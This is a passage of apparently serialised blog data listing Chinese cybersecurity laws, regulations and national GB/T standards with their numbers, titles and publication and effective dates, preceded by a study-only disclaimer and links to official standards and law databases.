可信计算密码支撑平台功能与接口规范<br />代替标准号：[GB/T  29829-2013](http://std.samr.gov.cn/gb/search/gbDetailed?id=71F772D7E974D3A7E05397BE0A0AB82A) 信息安全技术 可信计算密码支撑平台功能与接口规范 | 2022-04-15 | 2022-11-01 |\n| [GB/T 30283-2022](http://std.samr.gov.cn/gb/search/gbDetailed?id=DD3D95E5C13471EBE05397BE0A0AF33F) | 信息安全技术 信息安全服务 分类与代码<br />代替标准号：[GB/T 30283-2013](http://std.samr.gov.cn/gb/search/gbDetailed?id=71F772D7EDA9D3A7E05397BE0A0AB82A) 信息安全技术 信息安全服务 分类 | 2022-04-15 | 2022-11-01 |\n| [GB/T 31506-2022](http://std.samr.gov.cn/gb/search/gbDetailed?id=DD3D95E5C12B71EBE05397BE0A0AF33F) | 信息安全技术 政务网站系统安全指南<br />代替标准号：[GB/T 31506-2015](http://std.samr.gov.cn/gb/search/gbDetailed?id=71F772D804F5D3A7E05397BE0A0AB82A) 信息安全技术 政府门户网站系统安全技术指南 | 2022-04-15 | 2022-11-01 |\n| [GB/T 25069-2022](https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=56123482721B1AC3CEDCD3B5C022CAD8) | 信息安全技术 术语                                            | 2022-03-09 | 2022-10-01 |\n|                                                              | [网络安全审查办法](http://www.cac.gov.cn/2022-01/04/c_1642894602182845.htm) | 2022-01-04 | 2022-2-15  |\n\n### 2021 年及以前（按体系分类）\n\n#### 一般性法律规定\n\n- 《中华人民共和国宪法》，法律效力位阶：宪法，施行日期：2018-03-11\n- 《中华人民共和国国家安全法》，法律效力位阶：法律，施行日期：2015-07-01\n- 《中华人民共和国治安管理处罚法》，法律效力位阶：法律，施行日期：2013-01-01\n- 《中华人民共和国保守国家秘密法》，法律效力位阶：法律，施行日期：2010-10-01\n\n#### 规范和惩罚信息网络犯罪的法律\n\n- 《中华人民共和国刑法》，法律效力位阶：法律，施行日期：2021-03-01\n- 《全国人民代表大会常务委员会关于维护互联网安全的决定》法律效力位阶：有关法律问题和重大问题的决定，施行日期：2000-12-28\n\n#### 直接针对信息安全的特别规定\n\n- 《中华人民共和国网络安全法》，法律效力位阶：法律，施行日期：2017-06-01\n- 《中华人民共和国计算机信息系统安全保护条例》，法律效力位阶：行政法规，公布日期：2011-01-08\n- 《中华人民共和国电信条例》，法律效力位阶：行政法规，公布日期：2016-02-06\n- 《中华人民共和国计算机信息网络国际联网管理暂行规定》，法律效力位阶：行政法规，公布日期：1997-05-20\n- 《计算机信息网络国际联网安全保护管理办法》，法律效力位阶：行政法规，公布日期：2011-01-08\n\n#### 具体规范信息安全技术、信息安全管理\n\n- 《中华人民共和国电子签名法》，法律效力位阶：法律，施行日期：2019-04-23\n- 《计算机软件保护条例》，法律效力位阶：行政法规，公布日期：2013-01-30\n- 《商用密码管理条例》，法律效力位阶：行政法规，公布日期：1999-10-07\n- 《中华人民共和国保守国家秘密法实施条例》，法律效力位阶：行政法规，公布日期：2014-01-17\n- GB/T 37090-2018《信息安全技术 病毒防治产品安全技术要求和测试评价方法》，施行日期：2019-07-01\n- 《计算机信息系统国际联网保密管理规定》，颁布单位：国家保密局，施行日期：2000-01-01\n- 《金融机构计算机信息系统安全保护工作暂行规定》，颁布单位：公安部，颁布时间：1998-08-31\n\n## 关键词\n\n### 安全等级保护\n\n- GB/T 22240-2020，《信息安全技术 网络安全等级保护定级指南》，发布日期：2020-04-28，2020-11-01\n- GB/T 25058-2019，《信息安全技术 网络安全等级保护实施指南》，发布日期：2019-08-30，2020-03-01\n- GB/T 25070-2019，《信息安全技术 网络安全等级保护安全设计技术要求》，发布日期：2019-05-10，2019-12-01\n- GB/T 22239-2019，《信息安全技术 网络安全等级保护基本要求》，发布日期：2019-05-10，2019-12-01\n- GB/T 28448-2019，《信息安全技术 网络安全等级保护测评要求》，发布日期：2019-05-10，2019-12-01\n- GB/T 28449-2018，《信息安全技术 网络安全等级保护测评过程指南》，发布日期：2018-12-28，2019-07-01\n- GB/T 36958-2018，《信息安全技术 网络安全等级保护安全管理中心技术要求》，发布日期：2018-12-28，2019-07-01\n- GB/T 36959-2018，《信息安全技术 网络安全等级保护测评机构能力要求和评估规范》，发布日期：2018-12-28，2019-07-01\n- GB/T 37138-2018，《电力信息系统安全等级保护实施指南》，发布日期：2018-12-28，2019-07-01\n- GB/T 36627-2018，《信息安全技术 网络安全等级保护测试评估技术指南》，发布日期：2018-09-17，2019-04-01\n- GB/T 35317-2017，《公安物联网系统信息安全等级保护要求》，发布日期：2017-12-29，2017-12-29\n\n### 数据安全\n\n- GB/T 43739-2024《数据安全技术 应用商店的移动互联网应用程序（App）个人信息处理规范性审核与管理指南》，发布日期：2024-04-25，实施日期：2024-11-01\n- GB/T 43697-2024《数据安全技术 数据分类分级规则》，发布日期：2024-03-15，实施日期：2024-10-01\n- GB/T 42775-2023《证券期货业数据安全风险防控 数据分类分级指引》，发布日期：2023-08-06，实施日期：2023-08-06\n- GB/T 35274-2023《数据安全技术 大数据服务安全能力要求》，发布日期：2023-08-06，实施日期：2024-03-01\n- GB/T 42447-2023《信息安全技术 电信领域数据安全指南》，发布日期：2023-03-17，实施日期：2023-10-01\n- GB/T 41819-2022《信息安全技术 人脸识别数据安全要求》，发布日期：2022-10-14，实施日期：2023-05-01\n- GB/T 41806-2022《信息安全技术 基因识别数据安全要求》，发布日期：2022-10-14，实施日期：2023-05-01\n- GB/T 41773-2022《信息安全技术 步态识别数据安全要求》，发布日期：2022-10-14，实施日期：2023-05-01\n- GB/T 41807-2022《信息安全技术 声纹识别数据安全要求》，发布日期：2022-10-14，实施日期：2023-05-01\n- GB/T 42014-2022《信息安全技术 网上购物服务数据安全要求》，发布日期：2022-10-14，实施日期：2023-05-01\n- GB/T 42012-2022《信息安全技术 即时通信服务数据安全要求》，发布日期：2022-10-14，实施日期：2023-05-01\n- GB/T 42015-2022《信息安全技术 网络支付服务数据安全要求》，发布日期：2022-10-14，实施日期：2023-05-01\n- GB/T 42017-2022《信息安全技术 网络预约汽车服务数据安全要求》，发布日期：2022-10-14，实施日期：2023-05-01\n- GB/T 42016-2022《信息安全技术 网络音视频服务数据安全要求》，发布日期：2022-10-14，实施日期：2023-05-01\n- GB/T 42013-2022《信息安全技术 快递物流服务数据安全要求》，发布日期：2022-10-14，实施日期：2023-05-01\n- GB/T 39725-2020《信息安全技术 健康医疗数据安全指南》，发布日期：2020-12-14，实施日期：2021-07-01\n- GB/T 39477-2020《信息安全技术 政务信息共享 数据安全技术要求》，发布日期：2020-11-19，实施日期：2021-06-01\n- GB/T 37973-2019《信息安全技术 大数据安全管理指南》，发布日期：2019-08-30，实施日期：2020-03-01\n- GB/T 37988-2019《信息安全技术 数据安全能力成熟度模型》，发布日期：2019-08-30，实施日期：2020-03-01\n- GB/T 37373-2019《智能交通 数据安全服务》，发布日期：2019-05-10，实施日期：2019-12-01\n\n### 开源软件\n\n- GB/T 42927-2023《金融行业开源软件测评规范》，发布日期：2023-08-06，实施日期：2023-08-06\n\n### 信创\n\n- 网络关键设备和网络安全专用产品安全认证和安全检测结果检索，发布日期：2024-06-28（共 3286 项，符合标准 GB 42250-2022 等）\n- 《网络关键设备和网络安全专用产品目录》，发布日期：2023-07-03","path":"用户协议/index.html","layout":"page","_id":"cm8iuwsr60006rcn107xj7mj8","content":"<h1 id=\"SmallHao免责声明\"><a href=\"#SmallHao免责声明\" class=\"headerlink\" title=\"SmallHao免责声明\"></a>SmallHao免责声明</h1><p><strong>【免责声明】本博客所涉及的技术、思路和工具仅供学习，任何人不得将其用于非法用途和盈利，不得将其用于非授权渗透测试，否则后果自行承担，与本博客无关。</strong></p>\n<p>一个网络安全法律法规、安全政策、国家标准、行业标准知识库。</p>\n<h2 id=\"资源导航\"><a href=\"#资源导航\" class=\"headerlink\" title=\"资源导航\"></a>资源导航</h2><ul>\n<li>公安部公布打击黑客犯罪 10 起典型案例：<a href=\"https://mp.weixin.qq.com/s/vKqjc1uTajClu7bsn9yfLA\">https://mp.weixin.qq.com/s/vKqjc1uTajClu7bsn9yfLA</a></li>\n<li>公安部公布“百日行动”期间打击网络违法犯罪十大典型案例：<a href=\"https://news.cctv.com/2022/09/08/ARTIQLE0cQRPbqjPxAsOeUFe220908.shtml\">https://news.cctv.com/2022/09/08/ARTIQLE0cQRPbqjPxAsOeUFe220908.shtml</a></li>\n<li>国家标准全文公开系统：<a href=\"http://openstd.samr.gov.cn/bzgk/gb/index\">http://openstd.samr.gov.cn/bzgk/gb/index</a></li>\n<li>国家法律法规数据库：<a href=\"https://flk.npc.gov.cn/index.html\">https://flk.npc.gov.cn/index.html</a></li>\n<li>全国标准信息公共服务平台：<a href=\"http://std.samr.gov.cn/\">http://std.samr.gov.cn/</a></li>\n<li>自 2017 年 1 月 1 日后新发布的标准将在发布后 20 个工作日内公开</li>\n<li>国家互联网信息办公室 ：<a href=\"http://www.cac.gov.cn/\">http://www.cac.gov.cn/</a></li>\n</ul>\n<h2 id=\"法律法规\"><a href=\"#法律法规\" class=\"headerlink\" title=\"法律法规\"></a>法律法规</h2><h3 id=\"常见标准代号\"><a href=\"#常见标准代号\" class=\"headerlink\" title=\"常见标准代号\"></a>常见标准代号</h3><ul>\n<li>强制性国家标准代号 GB</li>\n<li>推荐性国家标准代号 GB&#x2F;T</li>\n<li>指导性技术文件代号 GB&#x2F;Z</li>\n<li>实物标准代号 GSB</li>\n</ul>\n<h3 id=\"2024-年新发布\"><a href=\"#2024-年新发布\" class=\"headerlink\" title=\"2024 年新发布\"></a>2024 年新发布</h3><table>\n<thead>\n<tr>\n<th>标准号</th>\n<th>标准名称</th>\n<th>发布日期</th>\n<th>实施日期</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>GB&#x2F;T 44810.2-2024</td>\n<td>IPv6 网络安全设备技术要求 第 2 部分：Web 应用防护系统（WAF）</td>\n<td>2024-10-26</td>\n<td>2025-02-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 44810.1-2024</td>\n<td>IPv6 网络安全设备技术要求 第 1 部分：防火墙</td>\n<td>2024-10-26</td>\n<td>2025-02-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 44810.3-2024</td>\n<td>IPv6 网络安全设备技术要求 第 3 部分：入侵防御系统（IPS）</td>\n<td>2024-10-26</td>\n<td>2025-02-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 44862-2024</td>\n<td>网络安全技术 网络弹性评价准则</td>\n<td>2024-10-26</td>\n<td>2025-05-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 31500-2024</td>\n<td>网络安全技术 存储介质数据恢复服务安全规范</td>\n<td>2024-10-26</td>\n<td>2025-05-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 44778-2024</td>\n<td>汽车诊断接口信息安全技术要求及试验方法</td>\n<td>2024-10-26</td>\n<td>2024-10-26</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 44774-2024</td>\n<td>汽车信息安全应急响应管理规范</td>\n<td>2024-10-26</td>\n<td>2024-10-26</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 44602-2024</td>\n<td>网络安全技术 智能门锁网络安全技术规范</td>\n<td>2024-09-29</td>\n<td>2025-04-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 44462.2-2024</td>\n<td>工业互联网企业网络安全 第 2 部分：平台企业防护要求</td>\n<td>2024-09-29</td>\n<td>2025-01-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 44462.3-2024</td>\n<td>工业互联网企业网络安全 第 3 部分：标识解析企业防护要求</td>\n<td>2024-09-29</td>\n<td>2025-01-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 44462.1-2024</td>\n<td>工业互联网企业网络安全 第 1 部分：应用工业互联网的工业企业防护要求</td>\n<td>2024-09-29</td>\n<td>2025-01-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 15852.2-2024</td>\n<td>网络安全技术 消息鉴别码 第 2 部分：采用专门设计的杂凑函数的机制</td>\n<td>2024-09-29</td>\n<td>2025-04-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 29244-2024</td>\n<td>网络安全技术 办公设备安全规范</td>\n<td>2024-09-29</td>\n<td>2025-04-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 20279-2024</td>\n<td>网络安全技术 网络和终端隔离产品技术规范</td>\n<td>2024-09-29</td>\n<td>2025-04-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 22081-2024</td>\n<td>网络安全技术 信息安全控制</td>\n<td>2024-09-29</td>\n<td>2025-04-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 15843.2-2024</td>\n<td>网络安全技术 实体鉴别 第 2 部分：采用鉴别式加密的机制</td>\n<td>2024-09-29</td>\n<td>2025-04-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 18238.1-2024</td>\n<td>网络安全技术 杂凑函数 第 1 部分：总则</td>\n<td>2024-09-29</td>\n<td>2025-04-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 18238.2-2024</td>\n<td>网络安全技术 杂凑函数 第 2 部分：采用分组密码的杂凑函数</td>\n<td>2024-09-29</td>\n<td>2025-04-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 18238.3-2024</td>\n<td>网络安全技术 杂凑函数 第 3 部分：专门设计的杂凑函数</td>\n<td>2024-09-29</td>\n<td>2025-04-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 44585.1-2024</td>\n<td>风险管理在接入 IT 网络的医疗器械中的应用 第 1 部分：联网医疗器械或健康软件在其实施和使用中的安全、有效性和网络安全</td>\n<td>2024-09-29</td>\n<td>2026-04-01</td>\n</tr>\n<tr>\n<td>GB 44495-2024</td>\n<td>汽车整车信息安全技术要求</td>\n<td>2024-08-23</td>\n<td>2026-01-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 43848-2024</td>\n<td>网络安全技术 软件产品开源代码安全评价方法</td>\n<td>2024-04-25</td>\n<td>2024-11-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 43779-2024</td>\n<td>网络安全技术 基于密码令牌的主叫用户可信身份鉴别技术规范</td>\n<td>2024-04-25</td>\n<td>2024-11-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 43741-2024</td>\n<td>网络安全技术 网络安全众测服务要求</td>\n<td>2024-04-25</td>\n<td>2024-11-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 43698-2024</td>\n<td>网络安全技术 软件供应链安全要求</td>\n<td>2024-04-25</td>\n<td>2024-11-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 43696-2024</td>\n<td>网络安全技术 零信任参考体系架构</td>\n<td>2024-04-25</td>\n<td>2024-11-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 43694-2024</td>\n<td>网络安全技术 证书应用综合服务接口规范</td>\n<td>2024-04-25</td>\n<td>2024-11-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 33565-2024</td>\n<td>网络安全技术 无线局域网接入系统安全技术要求</td>\n<td>2024-04-25</td>\n<td>2024-11-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 33563-2024</td>\n<td>网络安全技术 无线局域网客户端安全技术要求</td>\n<td>2024-04-25</td>\n<td>2024-11-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 30270-2024</td>\n<td>网络安全技术 信息技术安全评估方法</td>\n<td>2024-04-25</td>\n<td>2024-11-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 18336.5-2024</td>\n<td>网络安全技术 信息技术安全评估准则 第 5 部分：预定义的安全要求包</td>\n<td>2024-04-25</td>\n<td>2024-11-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 18336.4-2024</td>\n<td>网络安全技术 信息技术安全评估准则 第 4 部分：评估方法和活动的规范框架</td>\n<td>2024-04-25</td>\n<td>2024-11-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 18336.3-2024</td>\n<td>网络安全技术 信息技术安全评估准则 第 3 部分：安全保障组件</td>\n<td>2024-04-25</td>\n<td>2024-11-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 18336.2-2024</td>\n<td>网络安全技术 信息技术安全评估准则 第 2 部分：安全功能组件</td>\n<td>2024-04-25</td>\n<td>2024-11-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 18336.1-2024</td>\n<td>网络安全技术 信息技术安全评估准则 第 1 部分：简介和一般模型</td>\n<td>2024-04-25</td>\n<td>2024-11-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 17903.3-2024</td>\n<td>网络安全技术 抗抵赖 第 3 部分：用非对称技术的机制</td>\n<td>2024-03-15</td>\n<td>2024-10-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 31497-2024</td>\n<td>网络安全技术 信息安全管理 监视、测量、分析和评价</td>\n<td>2024-03-15</td>\n<td>2024-10-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 17903.1-2024</td>\n<td>网络安全技术 抗抵赖 第 1 部分：概述</td>\n<td>2024-03-15</td>\n<td>2024-10-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 15843.4-2024</td>\n<td>网络安全技术 实体鉴别 第 4 部分：用密码校验函数的机制</td>\n<td>2024-03-15</td>\n<td>2024-10-01</td>\n</tr>\n</tbody></table>\n<h3 id=\"2023-年新发布\"><a href=\"#2023-年新发布\" class=\"headerlink\" title=\"2023 年新发布\"></a>2023 年新发布</h3><table>\n<thead>\n<tr>\n<th>标准号</th>\n<th>标准名称</th>\n<th>发布日期</th>\n<th>实施日期</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>GB&#x2F;T 43578-2023</td>\n<td>信息安全技术 通用密码服务接口规范</td>\n<td>2023-12-28</td>\n<td>2024-07-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 43577.1-2023</td>\n<td>信息安全技术 电子发现 第 1 部分：概述和概念</td>\n<td>2023-12-28</td>\n<td>2024-07-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 35290-2023</td>\n<td>信息安全技术 射频识别（RFID）系统安全技术规范</td>\n<td>2023-12-28</td>\n<td>2024-07-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 43557-2023</td>\n<td>信息安全技术 网络安全信息报送指南</td>\n<td>2023-12-28</td>\n<td>2024-07-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 29246-2023</td>\n<td>信息安全技术 信息安全管理体系 概述和词汇</td>\n<td>2023-12-28</td>\n<td>2024-07-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 43532-2023</td>\n<td>核电厂仪表和控制系统网络安全防范管控</td>\n<td>2023-12-28</td>\n<td>2024-04-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 43269-2023</td>\n<td>信息安全技术 网络安全应急能力评估准则</td>\n<td>2023-11-27</td>\n<td>2024-06-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 43435-2023</td>\n<td>信息安全技术 移动互联网应用程序（App）软件开发工具包（SDK）安全要求</td>\n<td>2023-11-27</td>\n<td>2024-06-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 43445-2023</td>\n<td>信息安全技术 移动智能终端预置应用软件基本安全要求</td>\n<td>2023-11-27</td>\n<td>2024-06-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 43026-2023</td>\n<td>公共安全视频监控联网信息安全测试规范</td>\n<td>2023-09-07</td>\n<td>2024-10-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 42971-2023</td>\n<td>第三方电子合同服务平台信息安全技术要求</td>\n<td>2023-09-07</td>\n<td>2024-04-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 43046-2023</td>\n<td>信息技术服务 应对突发公共安全事件的信息技术应急风险管理</td>\n<td>2023-09-07</td>\n<td>2024-04-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 43207-2023</td>\n<td>信息安全技术 信息系统密码应用设计指南</td>\n<td>2023-09-07</td>\n<td>2024-04-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 43206-2023</td>\n<td>信息安全技术 信息系统密码应用测评要求</td>\n<td>2023-09-07</td>\n<td>2024-04-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 32916-2023</td>\n<td>信息安全技术 信息安全控制评估指南</td>\n<td>2023-09-07</td>\n<td>2024-04-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 32914-2023</td>\n<td>信息安全技术 网络安全服务能力要求</td>\n<td>2023-09-07</td>\n<td>2024-04-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 42884-2023</td>\n<td>信息安全技术 移动互联网应用程序（App）生命周期安全管理指南</td>\n<td>2023-08-06</td>\n<td>2024-03-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 42888-2023</td>\n<td>信息安全技术 机器学习算法安全评估规范</td>\n<td>2023-08-06</td>\n<td>2024-03-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 35274-2023</td>\n<td>信息安全技术 大数据服务安全能力要求</td>\n<td>2023-08-06</td>\n<td>2024-03-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;Z 42885-2023</td>\n<td>信息安全技术 网络安全信息共享指南</td>\n<td>2023-08-06</td>\n<td>2024-03-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 42926-2023</td>\n<td>金融信息系统网络安全风险评估规范</td>\n<td>2023-08-06</td>\n<td>2023-12-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 42708-2023</td>\n<td>金融网络安全威胁信息共享指南</td>\n<td>2023-08-06</td>\n<td>2023-08-06</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 42589-2023</td>\n<td>信息安全技术 电子凭据服务安全规范</td>\n<td>2023-05-23</td>\n<td>2023-12-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 24364-2023</td>\n<td>信息安全技术 信息安全风险管理实施指南</td>\n<td>2023-05-23</td>\n<td>2023-12-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 31168-2023</td>\n<td>信息安全技术 云计算服务安全能力要求</td>\n<td>2023-05-23</td>\n<td>2023-12-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 31167-2023</td>\n<td>信息安全技术 云计算服务安全指南</td>\n<td>2023-05-23</td>\n<td>2023-12-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 42574-2023</td>\n<td>信息安全技术 个人信息处理中告知和同意的实施指南</td>\n<td>2023-05-23</td>\n<td>2023-12-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 42572-2023</td>\n<td>信息安全技术 可信执行环境服务规范</td>\n<td>2023-05-23</td>\n<td>2023-12-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 42583-2023</td>\n<td>信息安全技术 政务网络安全监测平台技术规范</td>\n<td>2023-05-23</td>\n<td>2023-12-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 42571-2023</td>\n<td>信息安全技术 区块链信息服务安全规范</td>\n<td>2023-05-23</td>\n<td>2023-12-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 42582-2023</td>\n<td>信息安全技术 移动互联网应用程序（App）个人信息安全测评规范</td>\n<td>2023-05-23</td>\n<td>2023-12-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 42570-2023</td>\n<td>信息安全技术 区块链技术安全框架</td>\n<td>2023-05-23</td>\n<td>2023-12-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 42564-2023</td>\n<td>信息安全技术 边缘计算安全技术要求</td>\n<td>2023-05-23</td>\n<td>2023-12-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 28451-2023</td>\n<td>信息安全技术 网络入侵防御产品技术规范</td>\n<td>2023-05-23</td>\n<td>2023-12-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 20945-2023</td>\n<td>信息安全技术 网络安全审计产品技术规范</td>\n<td>2023-05-23</td>\n<td>2023-12-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 30282-2023</td>\n<td>信息安全技术 反垃圾邮件产品技术规范</td>\n<td>2023-05-23</td>\n<td>2023-12-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 20986-2023</td>\n<td>信息安全技术 网络安全事件分类分级指南</td>\n<td>2023-05-23</td>\n<td>2023-12-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 42573-2023</td>\n<td>信息安全技术 网络身份服务安全技术要求</td>\n<td>2023-05-23</td>\n<td>2023-12-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 35282-2023</td>\n<td>信息安全技术 电子政务移动办公系统安全技术规范</td>\n<td>2023-05-23</td>\n<td>2023-12-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 32920-2023</td>\n<td>信息安全技术 行业间和组织间通信的信息安全管理</td>\n<td>2023-05-23</td>\n<td>2023-12-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 42447-2023</td>\n<td>信息安全技术 电信领域数据安全指南</td>\n<td>2023-03-17</td>\n<td>2023-10-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 42453-2023</td>\n<td>信息安全技术 网络安全态势感知通用技术要求</td>\n<td>2023-03-17</td>\n<td>2023-10-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 42460-2023</td>\n<td>信息安全技术 个人信息去标识化效果评估指南</td>\n<td>2023-03-17</td>\n<td>2023-10-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 32922-2023</td>\n<td>信息安全技术 IPSec VPN 安全接入基本要求与实施指南</td>\n<td>2023-03-17</td>\n<td>2023-10-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 21054-2023</td>\n<td>信息安全技术 公钥基础设施 PKI 系统安全测评方法</td>\n<td>2023-03-17</td>\n<td>2023-10-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 21053-2023</td>\n<td>信息安全技术 公钥基础设施 PKI 系统安全技术要求</td>\n<td>2023-03-17</td>\n<td>2023-10-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 20274.1-2023</td>\n<td>信息安全技术 信息系统安全保障评估框架 第 1 部分：简介和一般模型</td>\n<td>2023-03-17</td>\n<td>2023-10-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 33134-2023</td>\n<td>信息安全技术 公共域名服务系统安全要求</td>\n<td>2023-03-17</td>\n<td>2023-10-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 42461-2023</td>\n<td>信息安全技术 网络安全服务成本度量指南</td>\n<td>2023-03-17</td>\n<td>2023-10-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 42446-2023</td>\n<td>信息安全技术 网络安全从业人员能力基本要求</td>\n<td>2023-03-17</td>\n<td>2023-10-01</td>\n</tr>\n</tbody></table>\n<h3 id=\"2022-年新发布\"><a href=\"#2022-年新发布\" class=\"headerlink\" title=\"2022 年新发布\"></a>2022 年新发布</h3><table>\n<thead>\n<tr>\n<th>标准号</th>\n<th>名称</th>\n<th>发布日期</th>\n<th>实施日期</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a href=\"https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=97F140EC1874D4C25CB8DC53B1D102D0\">GB 42250-2022</a></td>\n<td>信息安全技术 网络安全专用产品安全技术要求</td>\n<td>2022-12-29</td>\n<td>2023-07-01</td>\n</tr>\n<tr>\n<td><a href=\"https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=62C795EBF1BF0200A7161718CEFAABA8\">GB&#x2F;T 41817-2022</a></td>\n<td>信息安全技术 个人信息安全工程指南</td>\n<td>2022-10-14</td>\n<td>2023-05-01</td>\n</tr>\n<tr>\n<td><a href=\"https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=BE74B9780B8C4852D62CF47F282478B6\">GB&#x2F;T 41819-2022</a></td>\n<td>信息安全技术 人脸识别数据安全要求</td>\n<td>2022-10-14</td>\n<td>2023-05-01</td>\n</tr>\n<tr>\n<td><a href=\"https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=EACA08F5F077771ACE82FBE7987F40AE\">GB&#x2F;T 41806-2022</a></td>\n<td>信息安全技术 基因识别数据安全要求</td>\n<td>2022-10-14</td>\n<td>2023-05-01</td>\n</tr>\n<tr>\n<td><a href=\"https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=2137495F032BA9E69A753016027D271C\">GB&#x2F;T 41773-2022</a></td>\n<td>信息安全技术 步态识别数据安全要求</td>\n<td>2022-10-14</td>\n<td>2023-05-01</td>\n</tr>\n<tr>\n<td><a href=\"https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=AF1E9400C0F9C7051C33F773274825EA\">GB&#x2F;T 41807-2022</a></td>\n<td>信息安全技术 声纹识别数据安全要求</td>\n<td>2022-10-14</td>\n<td>2023-05-01</td>\n</tr>\n<tr>\n<td><a href=\"https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=9679A3BF5D736D7FC92FD8157AAAAC82\">GB&#x2F;T 42014-2022</a></td>\n<td>信息安全技术 网上购物服务数据安全要求</td>\n<td>2022-10-14</td>\n<td>2023-05-01</td>\n</tr>\n<tr>\n<td><a href=\"https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=136B8F06A548FAE8ABB375E4C65C1E38\">GB&#x2F;T 42012-2022</a></td>\n<td>信息安全技术 即时通信服务数据安全要求</td>\n<td>2022-10-14</td>\n<td>2023-05-01</td>\n</tr>\n<tr>\n<td><a href=\"https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=CEB5771DBBF05ED5EA99EBA50896537F\">GB&#x2F;T 42015-2022</a></td>\n<td>信息安全技术 